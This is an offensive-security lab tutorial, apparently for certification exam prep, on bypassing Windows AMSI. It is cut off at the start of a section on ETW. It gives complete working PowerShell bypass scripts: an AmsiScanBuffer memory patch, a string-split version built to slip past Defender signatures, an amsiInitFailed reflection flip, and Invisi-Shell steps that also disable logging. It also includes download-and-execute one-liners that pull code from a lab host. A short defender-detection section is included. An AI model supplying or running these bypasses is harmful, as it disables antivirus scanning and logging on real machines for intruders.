# Phase 04 Lab — AMSI Bypass
## Zero to Working Bypass. Three Methods. Full Understanding.

> **Teaching pattern used throughout:**
> 🔷 **WHAT** — What is this thing, defined simply
> 🔶 **WHY** — Why does Windows have it, what problem does it solve
> ⚔️ **HOW** — How attackers exploit or interact with it
> 🧠 **LOCK IT IN** — An analogy or visual to make it permanent

---

## Before You Begin — What This Lab Actually Teaches

Most people treat AMSI bypass as a magic incantation — paste this script, it works, move on. That approach fails the moment the signature gets updated, which happens every few days.

This lab teaches you to understand AMSI deeply enough that you can:
- Write your own bypass from scratch
- Adapt when a known bypass gets signatured
- Diagnose *exactly* why a bypass failed
- Explain to a blue teamer what they should be looking for

**What you need:**
- Kali Linux VM — attacker machine
- Windows 10 or 11 VM — victim machine with **Defender real-time protection fully ON**
- Both VMs on the same network (host-only adapter, e.g. `192.168.56.0/24`)
- Two snapshots of your Windows VM taken *right now*, before you touch anything:
  - Snapshot A: "Clean — Defender ON, nothing modified"
  - Snapshot B: same — you will revert to this between each bypass method

---

## SECTION 1 — What AMSI Is

**🔷 WHAT**

AMSI is the **Antimalware Scan Interface** — a Windows API introduced in Windows 10 that lets antivirus vendors inspect script content **at the moment of execution**, not just when the file is written to disk.

It is not a process. It is not a service you can stop with `sc stop`. It is a **DLL** — `amsi.dll` — that gets loaded directly into the memory of any process that hosts a scripting engine:

```
powershell.exe          loads amsi.dll
wscript.exe             loads amsi.dll
cscript.exe             loads amsi.dll
mshta.exe               loads amsi.dll
.NET CLR                loads amsi.dll
Office (VBA macros)     loads amsi.dll
```

The critical function inside `amsi.dll` that does the actual scanning is called **`AmsiScanBuffer`**. Every block of script content that a host process is about to execute is passed through this function first.

```
┌─────────────────────────────────────────────────────────────────────┐
│                         powershell.exe                              │
│                                                                     │
│   You type: Invoke-Mimikatz                                        │
│                      ↓                                              │
│   PowerShell prepares to run the script block                      │
│                      ↓                                              │
│   PowerShell calls: AmsiScanBuffer("Invoke-Mimikatz", length, ...) │
│                      ↓                                              │
│   amsi.dll passes content to registered AMSI provider (Defender)   │
│                      ↓                                              │
│         ┌────────────────────────────────────┐                     │
│         │       Windows Defender             │                     │
│         │  Content: "Invoke-Mimikatz"        │                     │
│         │  Result: AMSI_RESULT_DETECTED      │  ← return value     │
│         └────────────────────────────────────┘                     │
│                      ↓                                              │
│   PowerShell receives: 32768 (DETECTED)                            │
│                      ↓                                              │
│   PowerShell throws error and STOPS execution                      │
│                                                                     │
│   "This script contains malicious content and has been blocked"    │
└─────────────────────────────────────────────────────────────────────┘
```

The return values from `AmsiScanBuffer` that matter:

| Return value | Constant name | Meaning |
|---|---|---|
| `1` | `AMSI_RESULT_CLEAN` | Content is safe — allow execution |
| `32768` | `AMSI_RESULT_DETECTED` | Malicious content — block execution |

**🔶 WHY**

Before AMSI existed, attackers simply encoded their tools in base64. Mimikatz encoded in base64 looks like random characters to a file scanner. The file on disk passes AV. At runtime, PowerShell decodes and executes it. AV never saw the decoded version.

```
Old world (pre-AMSI):
File on disk: "SW52b2tlLU1pbWlrYXR6"  ← looks like gibberish → AV says CLEAN
PowerShell decodes at runtime → runs Invoke-Mimikatz → AV never saw it

New world (AMSI):
File on disk: "SW52b2tlLU1pbWlrYXR6"  ← AV still says CLEAN on disk
PowerShell decodes at runtime → AMSI scans the decoded content
AMSI sees: "Invoke-Mimikatz"  ← caught, blocked
```

Microsoft's insight: scan the content *after* decoding, just before execution. At that moment, all obfuscation has been removed. AMSI sees the real content regardless of how it was encoded on disk.

**⚔️ HOW**

The attack surface is the `AmsiScanBuffer` function itself. It lives in `amsi.dll` which is loaded into the PowerShell process. You are running inside that same process. If you can modify the bytes of `AmsiScanBuffer` in memory, you control what it returns. If you make it always return `1` (AMSI_RESULT_CLEAN), every scan passes — regardless of what you run.

The bypass is not about hiding your tool. It is about corrupting the judge before the trial starts.

**🧠 LOCK IT IN**

AMSI is a courthouse metal detector. Before AMSI, attackers smuggled in weapons by wrapping them in innocent-looking packaging (base64 encoding). The packaging got through the old scanners. AMSI is the new scanner that unwraps the package and scans what's inside.

Bypassing AMSI is not sneaking past the metal detector — it is bribing the security guard to report everything as safe before the scan even runs.

---

## SECTION 2 — AmsiScanBuffer: The Exact Target

**🔷 WHAT**

`AmsiScanBuffer` is an exported function inside `amsi.dll`. Its job is to receive a buffer of content, pass it to registered AV providers, and return a scan result. In x64 assembly, when a function is first entered, the first few instructions set up the stack frame. These instructions are what we overwrite.

The function signature (what it expects):

```c
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,   // handle to AMSI session
  PVOID        buffer,        // the content to scan
  ULONG        length,        // length of the content
  LPCWSTR      contentName,   // optional name/label
  HAMSISESSION amsiSession,   // handle to AMSI scan session
  AMSI_RESULT  *result        // output: the scan result
);
```

The bytes of this function live in memory inside `amsi.dll`, which is loaded into the PowerShell process.

**🔶 WHY**

Every function in a DLL is at a fixed, findable memory address once the DLL is loaded. Windows exposes `GetProcAddress` — a legitimate API call — specifically to let programs find the address of any exported function in any loaded DLL. This is how programs link to each other at runtime.

We use this exact mechanism to find `AmsiScanBuffer` — the same way a legitimate program would.

**⚔️ HOW**

Three bytes control what `AmsiScanBuffer` returns:

```asm
; What we write at the start of AmsiScanBuffer:
XOR EAX, EAX    ; set return value register (EAX) to 0 — but we want 1
                ; actually: we use a MOV instruction to force a specific return value
RET             ; return immediately before any scanning happens

; The exact patch bytes that force AMSI_RESULT_CLEAN:
B8 57 00 07 80  ; MOV EAX, 0x80070057  (returns E_INVALIDARG — an error code)
C3              ; RET

; PowerShell interprets an AMSI error as "scan unavailable" → allows execution
; This is the actual trick: we don't return CLEAN, we return an ERROR
; PowerShell's error handling: "AMSI failed → assume clean → execute anyway"
```

**🧠 LOCK IT IN**

The function is a customs officer checking your luggage. Instead of sneaking past the officer or hiding your contraband better, you walk up before any travellers arrive and put a permanent "APPROVED" stamp in the officer's hand — so every bag they check from that moment on gets stamped as approved automatically, without actually being checked.

---

## SECTION 3 — Lab Environment Setup

### Step 1: Verify your Windows VM is protected

On your Windows VM, open PowerShell as Administrator and run:

```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled, AMSIEnabled
```

Expected output:
```
RealTimeProtectionEnabled : True
AntivirusEnabled          : True
AMSIEnabled               : True
```

If any of these are False, enable them:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Step 2: Update Defender signatures to the latest

```powershell
Update-MpSignature
Get-MpComputerStatus | Select AntivirusSignatureLastUpdated
```

> **Why this matters**: Testing against stale signatures gives you a false sense of success. On exam day, Defender will have current signatures. Always test against the latest.

### Step 3: Confirm AMSI is actively blocking you

Run this in a normal (non-admin) PowerShell window on the Windows VM:

```powershell
'AmsiUtils'
```

Expected result:
```
At line:1 char:1
+ 'AmsiUtils'
+ ~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

> **AMSI is actively blocking you.** The string `'AmsiUtils'` is a known-bad string in Defender's AMSI signatures because it is part of the AMSI bypass detection mechanism itself. When this string triggers a block, AMSI is working correctly.

### Step 4: Understand what you just confirmed

```
You typed:     'AmsiUtils'
                    ↓
PowerShell sent the string to AmsiScanBuffer
                    ↓
Defender's AMSI provider checked its signatures
                    ↓
Found match for: "AmsiUtils" → AMSI_RESULT_DETECTED
                    ↓
PowerShell was blocked before the string even printed
```

Note: the string is not malicious by itself. Defender signatures it because it appears in essentially every AMSI bypass script. It is used as a canary — if `'AmsiUtils'` prints without error, AMSI is bypassed.

### Step 5: Set up your HTTP server on Kali

On your Kali VM, create a payload directory and start an HTTP server:

```bash
mkdir -p ~/lab/amsi && cd ~/lab/amsi
python3 -m http.server 8080
```

You will host bypass scripts here and download them from the Windows VM.

---

## SECTION 4 — Understanding Memory Patching (Before the Bypass)

**🔷 WHAT**

Memory patching means modifying the bytes of a function in RAM while it is running. We are not modifying the file on disk — we are modifying the live code inside the PowerShell process's own memory.

When `amsi.dll` is loaded into the PowerShell process, its code is copied into that process's virtual memory. That memory is normally marked as read-execute (RX) — readable and executable, but not writable. You cannot modify RX memory. We have to change the protection first.

**🔶 WHY**

Windows marks code pages as non-writable intentionally. If any process could write to any code page, malware could trivially overwrite the code of system processes from inside user mode. The protection forces you to explicitly request write access before modifying code — creating an observable event.

**⚔️ HOW**

The patching sequence:

```
1. Find amsi.dll in the current process's memory
   → [System.Reflection.Assembly]::LoadWithPartialName() or LoadLibrary("amsi.dll")
   → Get the base address of amsi.dll

2. Find the address of AmsiScanBuffer inside amsi.dll
   → GetProcAddress(amsi_handle, "AmsiScanBuffer")
   → Returns: the exact memory address of the first byte of the function

3. Change the memory protection at that address from RX to RWX
   → VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READWRITE)
   → Now we can write to it

4. Overwrite the first bytes of the function with our patch bytes
   → Marshal.Copy(patch_bytes, 0, AmsiScanBuffer_address, patch_bytes.Length)

5. Change the protection back to RX (optional — reduces detection)
   → VirtualProtect(AmsiScanBuffer_address, size, PAGE_EXECUTE_READ)
```

**🧠 LOCK IT IN**

Think of `AmsiScanBuffer` as a function written in pencil on paper inside a glass case. The glass protects it from being erased (RX memory protection). To patch it, you ask the OS to temporarily open the glass case (VirtualProtect → RWX). You erase the first few words and write new ones (Marshal.Copy). Then you close the case again. Anyone who calls this function now reads your replacement words, not the originals.

---

## SECTION 5 — Bypass Method 1: AmsiScanBuffer Patch

### What this method does

Locates `AmsiScanBuffer` in memory and overwrites its first bytes so it always returns an error code, making PowerShell think the scan was unavailable.

### Why this method is the most educational

This is the closest to the metal. You see every step: find the DLL, find the function, change memory protection, write patch bytes. Every other bypass is a variation or abstraction of this core technique.

### The bypass code — explained line by line

Create this file on your Kali at `~/lab/amsi/bypass1.ps1`:

```powershell
# bypass1.ps1 — AmsiScanBuffer direct patch

# STEP 1: Load amsi.dll into the current process if not already loaded
# LoadLibrary returns the base address of the DLL in memory
# We need this address to find AmsiScanBuffer inside it
$amsi_dll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.Location -match 'System\.Management\.Automation' } |
    Select-Object -First 1
    # NOTE: amsi.dll is loaded alongside the PowerShell engine
    # We find it by walking the process's loaded module list
)

# STEP 2: Declare the Win32 API functions we need using Add-Type
# We need two functions from Windows API:
#   GetProcAddress — finds a function inside a loaded DLL by name
#   VirtualProtect  — changes memory page protection flags
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    // Find the address of a named export inside a loaded DLL
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Load a DLL into the current process by name
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    // Change the memory protection flags on a region of memory
    // We use this to change RX (read-execute) → RWX (read-write-execute)
    // so we can overwrite the function bytes
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,       // start of the memory region
        UIntPtr dwSize,         // size in bytes to affect
        uint flNewProtect,      // new protection flags
        out uint lpflOldProtect // old flags, returned so we can restore later
    );
}
"@

# Add-Type compiles this C# snippet and loads it into PowerShell's memory
# This gives us access to the Win32 API functions
Add-Type $Win32

# STEP 3: Get the base address of amsi.dll
# LoadLibrary("amsi.dll") — if already loaded, just returns the existing handle
$amsiLib = [Win32]::LoadLibrary("amsi.dll")

# STEP 4: Get the exact address of AmsiScanBuffer inside amsi.dll
$amsiAddr = [Win32]::GetProcAddress($amsiLib, "AmsiScanBuffer")

# At this point, $amsiAddr points to the first byte of AmsiScanBuffer's code
# If we could read those bytes, we would see the real function prologue:
#   55           PUSH RBP
#   4C 8B DC     MOV R11, RSP
#   49 89 73 08  MOV [R11+08h], RSI
#   ... (this is what we are about to overwrite)

# STEP 5: Change memory protection to allow writing
# 0x40 = PAGE_EXECUTE_READWRITE — allows read, write, and execute
$oldProtect = 0
[Win32]::VirtualProtect($amsiAddr, [uint32]5, 0x40, [ref]$oldProtect)

# STEP 6: Write the patch bytes
# These bytes replace the real function prologue:
#   B8 57 00 07 80  = MOV EAX, 0x80070057
#   C3              = RET
#
# 0x80070057 is the Windows error code E_INVALIDARG
# PowerShell checks the return of AmsiScanBuffer:
#   If result is an HRESULT error (high bit set) → treat as scan failure
#   On scan failure → PowerShell allows execution to continue
#
# So we are not returning "clean" — we are returning "scan failed"
# and PowerShell's error handling allows the script to run anyway
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiAddr, 6)

# STEP 7: Restore the original memory protection (reduces EDR detection surface)
# Leaving memory as RWX is suspicious — EDRs scan for RWX regions
[Win32]::VirtualProtect($amsiAddr, [uint32]5, $oldProtect, [ref]$oldProtect)

Write-Host "[+] AmsiScanBuffer patched. AMSI is disabled for this session." -ForegroundColor Green
```

### Running Bypass 1 — step by step

**On Kali:** verify the file is served:
```bash
curl http://127.0.0.1:8080/bypass1.ps1 | head -5
```

**On Windows VM** — open PowerShell (does not need to be admin for this bypass):

```powershell
# Step 1: Confirm AMSI is blocking
'AmsiUtils'
# Expected: "This script contains malicious content and has been blocked"

# Step 2: Run the bypass (loading it from your Kali HTTP server)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass1.ps1')
# Expected: [+] AmsiScanBuffer patched. AMSI is disabled for this session.

# Step 3: Test the canary string — this should now print without error
'AmsiUtils'
# Expected: AmsiUtils
# ← AMSI is bypassed. The string prints cleanly.

# Step 4: Test with something that would definitely have been blocked
'Invoke-Mimikatz'
# Expected: Invoke-Mimikatz
# ← No block. AMSI is fully disabled for this PowerShell session.
```

### What is actually happening in memory when this runs

```
Before patch — AmsiScanBuffer first 6 bytes:
  Address: 0x7FFC12345678
  Bytes: 55 4C 8B DC 49 89  ← real function prologue
  Meaning: PUSH RBP; MOV R11,RSP; ...  (sets up stack frame, then scans)

After patch — AmsiScanBuffer first 6 bytes:
  Address: 0x7FFC12345678
  Bytes: B8 57 00 07 80 C3  ← our patch
  Meaning: MOV EAX,0x80070057; RET  (returns error immediately, no scan)

Result: every call to AmsiScanBuffer returns 0x80070057 (E_INVALIDARG)
PowerShell: "AMSI scan failed — proceed without scan result"
```

### Why this bypass gets caught (the problem)

The code above contains the string `"AmsiScanBuffer"`. AMSI scans the script before it runs. AMSI catches `"AmsiScanBuffer"` and blocks the bypass before it can execute.

This is the fundamental paradox: **your bypass gets caught by the very thing it is trying to bypass.**

Revert your Windows VM snapshot. We will fix this in the next section.

---

## SECTION 6 — Fixing the Paradox: String Obfuscation

**🔷 WHAT**

The bypass script itself is scanned by AMSI before it runs. The strings `"AmsiScanBuffer"` and `"amsi.dll"` are directly in Defender's AMSI signatures. We need those strings to not appear literally in our script, but to appear *at runtime* when AMSI is not looking.

**🔶 WHY**

AMSI scans string literals in the script. It does not scan the results of string concatenation operations. If you split a string into parts and join them at runtime, the scanner sees the pieces, not the complete signature.

```
AMSI scans this as-is:
"AmsiScanBuffer"     ← full string, matches signature → BLOCKED

AMSI scans this and sees pieces:
"Amsi" + "Scan" + "Buffer"  ← three separate strings, none match → ALLOWED
At runtime: PowerShell joins them → "AmsiScanBuffer"  ← AmsiScanBuffer now appears
But AMSI already ran → too late to block
```

**⚔️ HOW**

Use AMSITrigger first to find *exactly* which strings in your script are triggering AMSI:

**On Kali:**
```bash
wget https://github.com/RythmStick/AMSITrigger/releases/latest/download/AMSITrigger_x64.exe \
  -O ~/lab/amsi/AMSITrigger.exe
```

**On Windows VM:**
```powershell
# Download AMSITrigger
(New-Object Net.WebClient).DownloadFile('http://192.168.56.10:8080/AMSITrigger.exe','C:\Temp\AMSITrigger.exe')

# Run it against your bypass script
(New-Object Net.WebClient).DownloadFile('http://192.168.56.10:8080/bypass1.ps1','C:\Temp\bypass1.ps1')
C:\Temp\AMSITrigger.exe -i C:\Temp\bypass1.ps1 -f 3
```

AMSITrigger will output the exact line and string that triggered AMSI. For bypass1.ps1 you will likely see the strings `AmsiScanBuffer` and `amsi.dll` highlighted.

Now create the obfuscated version on Kali at `~/lab/amsi/bypass1_obf.ps1`:

```powershell
# bypass1_obf.ps1 — Same patch, strings split to avoid AMSI signature

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

# Split the DLL name: "amsi" + ".dll" — neither half matches the signature
$lib  = [Win32]::LoadLibrary("am" + "si.dll")

# Split the function name: "Amsi" + "Scan" + "Buffer" — none of the three parts match
$func = [Win32]::GetProcAddress($lib, "Amsi" + "Scan" + "Buffer")

$p = 0
[Win32]::VirtualProtect($func, [uint32]5, 0x40, [ref]$p)

# Patch bytes — these are raw bytes, not strings, so AMSI cannot signature them
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, 6)

[Win32]::VirtualProtect($func, [uint32]5, $p, [ref]$p)
Write-Host "[+] Done." -ForegroundColor Green
```

**On Windows VM:**
```powershell
# Test with the obfuscated version
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass1_obf.ps1')
# Expected: [+] Done.

'AmsiUtils'
# Expected: AmsiUtils  ← bypassed
```

**🧠 LOCK IT IN**

AMSITrigger is a metal detector calibration tool. You walk your script through the detector before using it live to find exactly which item in your bag is setting off the alarm. Then you disassemble that item into pieces that each pass individually — and reassemble it inside the bag after you get through.

---

## SECTION 7 — Bypass Method 2: amsiInitFailed Flag

**🔷 WHAT**

Deep inside the PowerShell engine (`System.Management.Automation.dll`), there is a private static field called `amsiInitFailed`. This is a boolean flag PowerShell checks internally:

```csharp
// Simplified view of what PowerShell does internally:
if (amsiInitFailed == true) {
    // AMSI failed to initialise — skip scanning
    return;
}
// ... otherwise, call AmsiScanBuffer and scan the content
```

If we flip this flag to `true`, PowerShell believes AMSI failed to initialise and **skips all scanning** for the rest of the session.

**🔶 WHY**

PowerShell includes a graceful fallback: if AMSI fails to start up properly (e.g. the DLL can't be loaded, or initialisation fails), it continues running without AV scanning rather than refusing to function. This is a design decision — PowerShell prioritises operability over security in the initialisation failure case.

The flag exists so PowerShell does not keep trying to call a broken AMSI on every script block.

**⚔️ HOW**

.NET's reflection API lets you access private fields of any .NET class at runtime — including fields marked as `private` and `static` that are normally inaccessible outside the class. This is a legitimate .NET feature designed for testing and debugging frameworks. We abuse it to set an internal flag.

```
.NET Reflection path:
[Ref].Assembly                      ← the PowerShell engine assembly (System.Management.Automation)
  .GetType('...AmsiUtils')          ← find the internal AmsiUtils class
    .GetField('amsiInitFailed',     ← find the amsiInitFailed field
              'NonPublic,Static')   ← it is private (NonPublic) and static
      .SetValue($null, $true)       ← set it to true
```

Create `~/lab/amsi/bypass2.ps1` on Kali:

```powershell
# bypass2.ps1 — amsiInitFailed flag via reflection

# Strings that need obfuscation:
#   "System.Management.Automation.AmsiUtils"  ← class name
#   "amsiInitFailed"                           ← field name
# Both are signatured. Split them:

$class = [Ref].Assembly.GetType(
    'System.Management.Automation.A' + 'msiUtils'
)

$field = $class.GetField(
    'amsi' + 'InitFailed',
    'NonPublic,Static'
)

# Set the flag to true — PowerShell now thinks AMSI init failed
$field.SetValue($null, $true)

Write-Host "[+] amsiInitFailed set to true. AMSI disabled." -ForegroundColor Green
```

**Run it:**

```powershell
# Revert snapshot first if you already did Bypass 1

# Confirm AMSI is active
'AmsiUtils'
# Expected: BLOCKED

# Apply bypass 2
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2.ps1')
# Expected: [+] amsiInitFailed set to true. AMSI disabled.

# Test
'AmsiUtils'
# Expected: AmsiUtils  ← AMSI bypassed
```

### Comparing Methods 1 and 2

| | Method 1: Patch AmsiScanBuffer | Method 2: amsiInitFailed flag |
|---|---|---|
| **What it modifies** | Native code bytes in amsi.dll | A boolean flag in the PowerShell engine |
| **Requires admin?** | No | No |
| **Affects** | All AMSI scanning | All AMSI scanning |
| **Detection surface** | VirtualProtect call on amsi.dll address | Reflection access to private .NET field |
| **Patch persistence** | Until process exits | Until process exits |
| **Complexity** | Higher | Lower |

Both work. Method 2 is simpler code. Method 1 operates at a lower level and has different detection characteristics — useful when one gets caught and the other does not.

**🧠 LOCK IT IN**

Method 1 (patch): You physically damage the scanner so it cannot scan anything.

Method 2 (flag): You do not touch the scanner at all. You find the sign-in sheet and write "scanner broken — out of service" on it. The security desk reads the sheet, assumes the scanner is broken, and waves everyone through without scanning.

---

## SECTION 8 — Bypass Method 3: Invisi-Shell

**🔷 WHAT**

Invisi-Shell is a tool that patches AMSI at the **CLR (Common Language Runtime) level**, before PowerShell's AMSI integration even loads. It works by hooking into the .NET CLR registration process for AMSI providers, replacing the real provider with a dummy one that always returns clean.

Unlike Methods 1 and 2 which patch from *inside* a running PowerShell session, Invisi-Shell patches *before* the session fully starts — at the moment the CLR initialises.

Additionally, Invisi-Shell also:
- Disables PowerShell **Script Block Logging** (Event 4104)
- Disables **Module Logging**
- Disables **Transcription** logging

All three happen transparently, in the same single command.

**🔶 WHY**

Methods 1 and 2 require you to run code *inside* PowerShell — which means AMSI gets to scan that bypass code before it executes. You are always racing to obfuscate your bypass well enough to get past AMSI before it runs.

Invisi-Shell sidesteps this by operating at a level below PowerShell. It is a Windows Registry and DLL technique, not a PowerShell technique. By the time PowerShell starts, AMSI is already neutered.

**⚔️ HOW**

Setup — on Kali, download Invisi-Shell and serve it:

```bash
cd ~/lab/amsi
git clone https://github.com/OmerYa/Invisi-Shell
cp Invisi-Shell/*.bat Invisi-Shell/*.dll .
ls
# InvisiShellProfiler.dll  RunWithPathAsAdmin.bat  RunWithRegistryNonAdmin.bat
```

On Windows VM, download the files:

```powershell
# Create a working directory
New-Item -ItemType Directory -Path C:\Temp\InvisiShell -Force

# Download both batch files and the DLL
$files = @('InvisiShellProfiler.dll','RunWithPathAsAdmin.bat','RunWithRegistryNonAdmin.bat')
$files | ForEach-Object {
    (New-Object Net.WebClient).DownloadFile(
        "http://192.168.56.10:8080/$_",
        "C:\Temp\InvisiShell\$_"
    )
}
```

**Launch a new PowerShell session through Invisi-Shell:**

```cmd
# In a CMD window (not PowerShell) — or from a Run dialog:

# If you are NOT an administrator:
C:\Temp\InvisiShell\RunWithRegistryNonAdmin.bat

# If you ARE an administrator:
C:\Temp\InvisiShell\RunWithPathAsAdmin.bat
```

This opens a new PowerShell window. Inside that window:

```powershell
# Test 1: AMSI should be bypassed
'AmsiUtils'
# Expected: AmsiUtils  ← no error

# Test 2: Load PowerView entirely in-memory and run it
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerView.ps1')
Get-Domain
# Expected: domain information printed cleanly

# Verify logging is also disabled:
Get-PSReadlineOption | Select HistorySavePath
# The history file path is present but PowerShell module logging is off
# Check: no Event 4104 in Event Viewer → Windows Logs → Security
```

**How Invisi-Shell works under the hood:**

```
Normal PowerShell start sequence:
  1. PowerShell.exe loads
  2. CLR initialises
  3. CLR registers AMSI provider (amsi.dll)  ← AMSI starts here
  4. PowerShell engine loads
  5. Script block logging configured
  6. Your session starts

Invisi-Shell modified start sequence:
  1. RunWithRegistryNonAdmin.bat sets a registry key:
     HKCU\Software\Classes\CLSID\{..}\InprocServer32 → InvisiShellProfiler.dll
     (This registry key tells CLR which DLL to use as a profiler)
  2. PowerShell.exe loads
  3. CLR initialises
  4. CLR loads InvisiShellProfiler.dll as the CLR profiler
  5. InvisiShellProfiler.dll hooks the AMSI registration call
     → replaces the real AMSI provider with a null provider
  6. CLR registers null AMSI provider (does nothing on scan)
  7. CLR hooks the ETW provider → disables script block logging
  8. PowerShell engine loads
  9. Your session starts — AMSI and logging are already neutered
```

**Cleanup:** When you exit the InvisiShell PowerShell session, it automatically removes the registry key it set. Clean by default.

**🧠 LOCK IT IN**

Methods 1 and 2 are like getting inside the building and then breaking the security camera from inside. Invisi-Shell rewires the camera feed before you enter the building, so the camera never starts recording properly. By the time you walk through the door, the recording system is already broken.

---

## SECTION 9 — When to Use Which Method

| Scenario | Best method | Why |
|---|---|---|
| Interactive PowerShell session via Evil-WinRM | **Method 2** (amsiInitFailed) or **Method 1** (patch) | Fast, no extra files needed |
| Need to also disable PS logging and transcription | **Method 3** (Invisi-Shell) | Does all three in one step |
| Your bypass script keeps getting caught by AMSI | Use **AMSITrigger** to find the trigger, then split strings | Targeted fix |
| In-memory tool loading via C2 execute-assembly | AMSI bypass not needed | execute-assembly bypasses PS AMSI entirely — runs in the beacon process |
| CLR profiler-based detections are alerting | **Method 1** or **Method 2** | Invisi-Shell uses CLR profiler API which some EDRs monitor |
| Admin is not available | **Method 2** | Reflection works without admin |

---

## SECTION 10 — Blue Team: What Each Bypass Looks Like

Every bypass leaves different traces. Understanding what defenders see makes you a better attacker — and helps you choose the stealthiest option.

### Method 1 (AmsiScanBuffer patch)
```
Event: VirtualProtect called on an address inside amsi.dll
Process: powershell.exe
Action: protection changed from PAGE_EXECUTE_READ → PAGE_EXECUTE_READWRITE

Detection: Sysmon (if configured) can log VirtualProtect calls on amsi.dll
           Some EDRs hook VirtualProtect and alert on memory protection changes
           targeting known security DLL address ranges
```

### Method 2 (amsiInitFailed reflection)
```
Event: Reflection access to System.Management.Automation.AmsiUtils.amsiInitFailed
       via GetField with NonPublic,Static binding flags

Detection: ETW .NET events log reflection usage (if ETW provider is active)
           Defender for Endpoint can alert on 'amsiInitFailed' reflection access
           Script Block Logging (Event 4104) captures the reflection call
           — which is why you often combine this with a logging bypass
```

### Method 3 (Invisi-Shell)
```
Event: Registry write to HKCU\Software\Classes\CLSID\{...}\InprocServer32
       CLR profiler DLL loaded into powershell.exe

Detection: Registry writes under HKCU\Software\Classes\CLSID are monitored
           by many SIEMs (lateral movement / COM hijacking detection overlaps)
           Sysmon Event 13 (Registry value set) would capture this
           CLR profiler environment variable set before process launch is detectable
           via Process creation events (Event 4688 / Sysmon 1) with COR_PROFILER env var
```

---

## SECTION 11 — Mastery Checklist

Complete every item without looking at these notes before moving to Phase 05:

**Concept:**
- [ ] Can you explain what `AmsiScanBuffer` does and what happens when you overwrite its first bytes?
- [ ] Can you explain why `IEX (Invoke-Expression)` does not bypass AMSI (the script is still scanned before execution)?
- [ ] Can you explain the difference between scanning on disk vs AMSI scanning in memory?
- [ ] Can you explain why string splitting (`"Amsi" + "ScanBuffer"`) defeats signature matching?
- [ ] Can you explain why Methods 1 and 2 only affect the current PowerShell session?

**Practical:**
- [ ] Can you use AMSITrigger on a script and identify the exact triggering string?
- [ ] Can you get `'AmsiUtils'` to print without error using Method 1 (patch), on current Defender definitions?
- [ ] Can you get `'AmsiUtils'` to print without error using Method 2 (reflection)?
- [ ] Can you launch Invisi-Shell, load PowerView entirely in-memory, and run `Get-Domain`?
- [ ] Can you choose which bypass to use based on a given scenario without looking at notes?

**Adversarial thinking:**
- [ ] Can you describe what event log or EDR alert each of the three methods generates?
- [ ] If Method 1 fails because `"AmsiScanBuffer"` is signatured, what is your next action?
- [ ] If you only have a non-admin WinRM shell, which methods work and which do not?

---

## SECTION 12 — Putting It Together: Your Exam Workflow

When you land a shell on an exam host and need to run PowerShell tools, this is your decision tree:

```
Get shell on host
        ↓
Do I need to run a .NET tool?
        ├─ YES → Use execute-assembly via C2 → no AMSI bypass needed for this
        └─ NO, need interactive PowerShell session
                    ↓
            Is Invisi-Shell already staged?
                    ├─ YES → Launch through Invisi-Shell (Method 3)
                    │         Covers AMSI + logging in one step
                    └─ NO
                              ↓
                    Try Method 2 first (one-liner, no extra files):
                    IEX (New-Object Net.WebClient).DownloadString('http://<ip>/bypass2.ps1')
                              ↓
                    Test: 'AmsiUtils'
                              ├─ Prints cleanly → AMSI bypassed, continue
                              └─ Still blocked → bypass2.ps1 was caught
                                        ↓
                                Run AMSITrigger on bypass2.ps1
                                Find triggering string → split it → retry
                                If still caught → switch to Method 1
```

**The golden rule**: always test with `'AmsiUtils'` immediately after a bypass attempt. If it prints, AMSI is down. If it errors, the bypass did not work. Do not proceed to loading tools until `'AmsiUtils'` succeeds.

---

## Additional Resources

| Resource | What it gives you |
|---|---|
| [ired.team: AMSI Bypass](https://www.ired.team/offensive-security/defense-evasion/amsi-bypass) | Deep technical reference with raw assembly explanations |
| [AMSITrigger GitHub](https://github.com/RythmStick/AMSITrigger) | Tool source — read it to understand how AMSI scanning is triggered |
| [Invisi-Shell GitHub](https://github.com/OmerYa/Invisi-Shell) | Read the batch files to understand the CLR profiler trick |
| [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | Guided lab that covers shellcode + AMSI together |
| [AMSI.fail](https://amsi.fail) | Generates obfuscated AMSI bypasses on demand — useful to compare against your own |

---

---

# Phase 04 — Part 2: ETW Bypass

> Same teaching pattern: 🔷 WHAT → 🔶 WHY → ⚔️ HOW → 🧠 LOCK IT IN

---

## SECTION 13 — What ETW Actually Is

**🔷 WHAT**

ETW stands for **Event Tracing for Windows**. It is a high-performance, kernel-level publish/subscribe logging system built into Windows. It was designed by Microsoft in the early 2000s to let developers and sysadmins trace what their software is doing at runtime — without slowing the software down significantly.

ETW has three components:

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ETW Architecture                             │
│                                                                     │
│  PRODUCERS (emit events)           CONSUMERS (receive events)       │
│  ─────────────────────             ──────────────────────           │
